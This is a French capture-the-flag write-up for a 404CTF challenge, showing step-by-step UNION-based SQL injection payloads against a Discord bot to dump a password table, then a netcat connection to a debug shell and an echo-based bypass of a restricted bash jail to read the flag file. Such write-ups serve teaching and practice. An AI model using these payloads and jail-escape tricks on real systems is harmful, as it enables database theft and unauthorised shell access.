On doit tirer le flag du nez d'un bot discord.

Bot discord avec trois commandes :
```
Je ne suis pas un automate, juste un humain qui veut aider :-)
Commandes disponibles :
!chercher argument -> rechercher argument dans la base de données
!authentification motdepasse -> authentifiez vous pour accéder au mode privilégié
!drapeau -> obtenez un mystérieux drapeau
```

!chercher : permet de chercher du texte dans une liste.

On remarque que la commande est sensible aux injections SQL.

La table n'a qu'une seule colonne :
```
!chercher a" GROUP BY 1 -- - : OK
!chercher a" GROUP BY 2 -- - : KO
```
Le mot de passe est probablement dans une autre table.

Vulnérable aux unions :
```
!chercher a" UNION SELECT null -- - : OK
```
On récupère les db :
```
!chercher a" UNION SELECT schema_name FROM information_schema.schemata -- -
Je suis un gentil humain
BOT
 — Aujourd’hui à 00:11
Results:
Result #1:
>bcra
Result #2:
>information_schema
Result #3:
>test
Result #4:
>data
```
On récupère les tables :
```
!chercher a" UNION SELECT table_name FROM information_schema.tables WHERE table_schema='data' -- -
Je suis un gentil humain
BOT
 — Aujourd’hui à 00:15
Results:
Result #1:
>bcra
Result #2:
>Privileged_users
Result #3:
>data
Result #4:
>password
```

Et les colomnes :
```
!chercher a" UNION SELECT column_name FROM information_schema.columns WHERE table_name='password' -- -
Je suis un gentil humain
BOT
 — Aujourd’hui à 00:17
Results:
Result #1:
>bcra
Result #2:
>password
```

Injection finale :
```
!chercher a" UNION SELECT password FROM password -- -
Je suis un gentil humain
BOT
 — Aujourd’hui à 00:18
Results:
Result #1:
>bcra
Result #2:
>404CTF{D1sc0rd_&_injection_SQL}
```

Flag 1 : 404CTF{D1sc0rd_&_injection_SQL}

============================================

On s'authentifie et on a une nouvelle commande :

```
!aide
Je suis un gentil humain
BOT
 — Aujourd’hui à 20:57
Je ne suis pas un automate, juste un humain qui veut aider :-)
Commandes disponibles :
!chercher argument -> rechercher argument dans la base de données
!authentification motdepasse -> authentifiez vous pour accéder au mode privilégié
!drapeau -> obtenez un mystérieux drapeau
!debug -> debug command
```

```
!debug
Je suis un gentil humain
BOT
 — Aujourd’hui à 21:07
Debug déployé sur le port 31337 ! Mot de passe : p45_uN_4uT0m4t3
```

On cherche l'ip :
```
host ctf.404ctf.fr     
ctf.404ctf.fr has address 141.94.211.171
ctf.404ctf.fr has address 141.94.211.60
ctf.404ctf.fr has address 141.94.215.133
ctf.404ctf.fr has address 141.94.211.6
ctf.404ctf.fr has address 141.94.209.151
```
```
nc 141.94.209.151 31337 
Veuillez entrer le mot de passe :
p45_uN_4uT0m4t3
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$ 
```

On est dans une jail assez basique bash.

Les commandes ls et cat ne fonctionnent pas, mais echo si !\
On fait `echo *` pour lister les fichiers et `echo $(<file)` pour le cat.
```
bash-4.4$ echo *
echo *
auth_wall.sh flag.txt

bash-4.4$ echo "$(<flag.txt)"
echo "$(<flag.txt)"
404CTF{17_s_4g155417_3n_f4iT_d_1_b0t}
```

